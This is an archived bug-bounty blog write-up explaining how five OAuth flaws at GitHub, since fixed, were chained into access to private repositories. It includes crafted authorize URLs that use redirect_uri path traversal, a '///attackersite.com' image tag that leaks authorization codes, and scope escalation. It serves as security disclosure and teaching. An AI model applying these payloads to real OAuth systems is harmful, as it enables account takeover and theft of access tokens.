---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2014-02-07_how-i-hacked-github-again.md
original_filename: 2014-02-07_how-i-hacked-github-again.md
title: How I hacked Github again.
category: documents
detected_topics:
- oauth
- api-security
- access-control
- command-injection
- path-traversal
- mfa
tags:
- imported
- documents
- oauth
- api-security
- access-control
- command-injection
- path-traversal
- mfa
language: en
raw_sha256: 4543d6cfef82228c981f1ced6718c221697e71aca16f9261a9936de04d56a825
text_sha256: e04f05efe4c46392ce27f105621327f20677f16f8be77d708ed15665454e919f
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked Github again.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2014-02-07_how-i-hacked-github-again.md
- Source Type: markdown
- Detected Topics: oauth, api-security, access-control, command-injection, path-traversal, mfa
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `4543d6cfef82228c981f1ced6718c221697e71aca16f9261a9936de04d56a825`
- Text SHA256: `e04f05efe4c46392ce27f105621327f20677f16f8be77d708ed15665454e919f`


## Content

---
title: "How I hacked Github again."
page_title: "Egor Homakov: How I hacked Github again."
url: "http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html"
final_url: "http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html"
authors: ["Egor Homakov (@homakov)"]
programs: ["GitHub"]
bugs: ["Open redirect", "Account takeover", "Information disclosure"]
bounty: "4,000"
publication_date: "2014-02-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6380
---

This is a story about 5 Low-Severity bugs I pulled together to create a simple but high severity exploit, giving me access to private repositories on Github.  
  
These vulnerabilities were reported privately and fixed in timely fashion. Here is the "timeline" of my emails.  
  
[More detailed/alternative explanation](http://www.reddit.com/r/netsec/comments/1xa5xh/how_i_hacked_github_again/cf9qjcl).  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVqLenKyX5cX7fdNycOwPJ7SiquvouDa1Lp8tXB0OKEKtYPRkREchBoWsuLzmDKFZBjPPcgCZp_IXz8Dgu0LHWz9v1QDoz7Z0802P2HvyNBUMM3v0sCQVnuI5jia0CbaG863g8OUuXbDb8/s1600/Screen+Shot+2014-02-05+at+6.50.54+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVqLenKyX5cX7fdNycOwPJ7SiquvouDa1Lp8tXB0OKEKtYPRkREchBoWsuLzmDKFZBjPPcgCZp_IXz8Dgu0LHWz9v1QDoz7Z0802P2HvyNBUMM3v0sCQVnuI5jia0CbaG863g8OUuXbDb8/s1600/Screen+Shot+2014-02-05+at+6.50.54+PM.png)

  
A few days ago Github launched a [Bounty program](https://bounty.github.com/) which was a good motivator for me to play with [Github OAuth](https://developer.github.com/v3/oauth/).  

####  Bug 1. Bypass of redirect_uri validation with /../ 

First thing I noticed was:  

> If provided, the redirect URL’s host and port must exactly match the callback URL. The redirect URL’s path **must reference a subdirectory of the callback URL**

I then tried path traversal with /../ — it worked. 

####  Bug 2. Lack of redirect_uri validation on get-token endpoint

The first bug alone isn't worth much. There's protection in OAuth2 from "leaky" redirect_uri's, every 'code' has corresponding 'redirect_uri' it was issued for. To get an access token you must supply exact redirect_uri you used in the authorization flow.  

> `redirect_uri`| `string`| The URL in your app where users will be sent after authorization. See details below about [redirect urls](https://developer.github.com/v3/oauth/#redirect-urls).  
> ---|---|---  
  
Too bad. I decided to find out whether the protection was implemented properly.  
  
It was flawed: no matter what redirect_uri the Client sent to get a token, the Provider responded with valid access_token.  
Without the first bug, the second would be worth nothing as well. But together they turn into a powerful vulnerability — the attacker could hijack the authorization code issued for a "leaky" redirect_uri, then apply the leaked code on real Client's callback to log in Victim's account. Btw it was the same bug I found in VK.com.  
  
It's a serious issue and **can be used to compromise "Login with Github"** functionality on all websites relying on it. I opened [Applications page](https://github.com/settings/applications) to see what websites I should check. This section got my attention:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0TFSv1xHVD3X3yUc0k2aQHYT4t90Lq4yUPT9APg8_rkU_LjxaOrnzV_RcG8HiqFGP90ZhITxJFnvFL08auAixXwqyM2XlilK7luBr3GNGKG1-FbUndQp7I_Hmlvzy8vZuP-l2Itg-xdRw/s1600/Screen+Shot+2014-02-05+at+5.56.08+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0TFSv1xHVD3X3yUc0k2aQHYT4t90Lq4yUPT9APg8_rkU_LjxaOrnzV_RcG8HiqFGP90ZhITxJFnvFL08auAixXwqyM2XlilK7luBr3GNGKG1-FbUndQp7I_Hmlvzy8vZuP-l2Itg-xdRw/s1600/Screen+Shot+2014-02-05+at+5.56.08+PM.png)

  
  
Gist, Education, Pages and Speakerdeck are official pre-approved OAuth clients. I couldn't find client_id of Pages/Education, Speakerdeck was out of Bounty scope (I found account hijacking there and was offered $100). Let's find a Referer-leaking page on Gist then.  
  

####  Bug 3. Injecting cross domain image in a gist.

Basically, there are two vectors for leaking Referers: user clicks a link (requires interaction) or user agent loads some cross domain resource, like <img>.  
I can't simply inject <img src=http://attackersite.com> because it's going to be replaced by [Camo-proxy](https://github.com/atmos/camo) URL, which doesn't pass Referer header to attacker's host. To bypass Camo-s filter I used following trick: **< img src="///attackersite.com">**  
You can find more details about this vector in [Evolution of Open Redirect Vulnerability](http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html).  
///host.com is parsed as a path-relative URL by Ruby's URI library but it's treated as a protocol-relative URL by Chrome and Firefox. Here's our crafted URL:  
  
https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%**2Fcallback/../../../homakov/8820324** &response_type=code  
  
When the user loads this URL, Github 302-redirects him automatically.  
  
Location: https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE  
  
But the user agent loads https://gist.github.com/homakov/8820324?code=CODE  
  
Then user agent leaks CODE sending request to our <img>:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLIwwO0Nlx8d0og5MW6mbRKvEUIaOAlD_aPlL_m2r-GmPzJBWlP7LMbTBnsLVSGl2t91rDj5lhQxISwBJAJMTpdlykR3o9fqDr5fUvNGYlQZu9S86e0VGDWmEc-lVvCzimPeRZXNp3-MMb/s1600/Screen+Shot+2014-02-05+at+5.15.39+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLIwwO0Nlx8d0og5MW6mbRKvEUIaOAlD_aPlL_m2r-GmPzJBWlP7LMbTBnsLVSGl2t91rDj5lhQxISwBJAJMTpdlykR3o9fqDr5fUvNGYlQZu9S86e0VGDWmEc-lVvCzimPeRZXNp3-MMb/s1600/Screen+Shot+2014-02-05+at+5.15.39+PM.png)

As soon as we get victim's CODE we can hit https://gist.github.com/auth/github/callback?code=CODE and voila, we are logged into the victim's account and we have access to private gists.  
  

####  Bug 4. Gist reveals github_token in cookies

I was wondering how Gist persists the user session and decoded _gist_session cookie (which is regular Rails Base64 encoded cookie):  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZpTni0WUQjE8XyhVwXDEHgA8aCxD3KpQWc1C7JCjuIDbeQKwzkuaUbeduPoKBpqbBznWyuSXjNsd3ew4ay1YO3JDV4Jxfor4ijAR7dDKXJ7Yl9peWRhdwiCIwtfgKL15-bO8JK2PWvGmY/s1600/Screen+Shot+2014-02-05+at+5.59.16+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZpTni0WUQjE8XyhVwXDEHgA8aCxD3KpQWc1C7JCjuIDbeQKwzkuaUbeduPoKBpqbBznWyuSXjNsd3ew4ay1YO3JDV4Jxfor4ijAR7dDKXJ7Yl9peWRhdwiCIwtfgKL15-bO8JK2PWvGmY/s1600/Screen+Shot+2014-02-05+at+5.59.16+PM.png)

Oh my, another OAuth anti-pattern! Clients should never reveal actual access_token to the user agent. Now we can use this github_token to perform API calls on behalf of the victim's account, without the Gist website. I tried to access private repos:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikPHfleenagl0koBfNSChs5_OiI23TaPoa6nj_upC3FgOWumVqhjdRFHGdFcJdqbwmLjIRXJSNc8k7VY9QApJGwjRPi3pyDapu8birKRR74Sp_xddj08Sbr1-TtekRPdNCvoXq0XPQNtCy/s1600/Screen+Shot+2014-02-05+at+6.00.45+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikPHfleenagl0koBfNSChs5_OiI23TaPoa6nj_upC3FgOWumVqhjdRFHGdFcJdqbwmLjIRXJSNc8k7VY9QApJGwjRPi3pyDapu8birKRR74Sp_xddj08Sbr1-TtekRPdNCvoXq0XPQNtCy/s1600/Screen+Shot+2014-02-05+at+6.00.45+PM.png)

Damn it, the token's scope is just "gists", apparently...  
  

####  Bug 5. Auto approval of 'scope' for Gist client.

Final touch of my exploit. Since Gist is a pre-approved Client, I assumed Github approves any scope the Gist Client asks for automatically. And I was right.  
  
All we need now is to load the crafted URL into the victim's browser:  
  
https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%**2Fcallback/../../../homakov/8820324** &response_type=code&**scope=repo,gists,user,delete_repo,notifications**  

  

The user-agent leaks the victim's CODE, Attacker uses leaked CODE to log into the victim's Gist account, decodes _gist_session to steal github_token and ...  
NoScript is not going to help. The exploit is script-less.  
**Private repos, read/write access, etc** — all of it in stealth-mode, because the github_token belongs to Gist client. Perfect crime, isn't it?

####  Bounty

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCNUInPZyVY871qJogRioSVZ7tnuWn83b2HaBGL3wIiPTJ02WIKOH8173Aq9yciwfYGQm4Z6ZDUZsOpjAeupswQvoJPUDHGFyB4Zkm4cju6stkJ9feHnVa2xuOPz8pgb0z-Ajn6c8C4VV0/s1600/Screen+Shot+2014-02-07+at+10.58.16+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCNUInPZyVY871qJogRioSVZ7tnuWn83b2HaBGL3wIiPTJ02WIKOH8173Aq9yciwfYGQm4Z6ZDUZsOpjAeupswQvoJPUDHGFyB4Zkm4cju6stkJ9feHnVa2xuOPz8pgb0z-Ajn6c8C4VV0/s1600/Screen+Shot+2014-02-07+at+10.58.16+PM.png)

  

$4000 reward is pretty good. Interestingly, it would be even cheaper for them to buy 4-5 hours of my consulting services at $400/hr which would have cost them $1600 instead. Crowdsourced-security is also an important thing to have. It's better to use them both :)  
  
[I'd love to help your company & save you a lot of money.](http://www.sakurity.com/)  
  
P.S. I have two other posts about Github vulnerabilities: [mass assignment](http://homakov.blogspot.com/2012/03/how-to.html) and [cookie tossing](http://homakov.blogspot.com/2013/03/hacking-github-with-webkit.html).
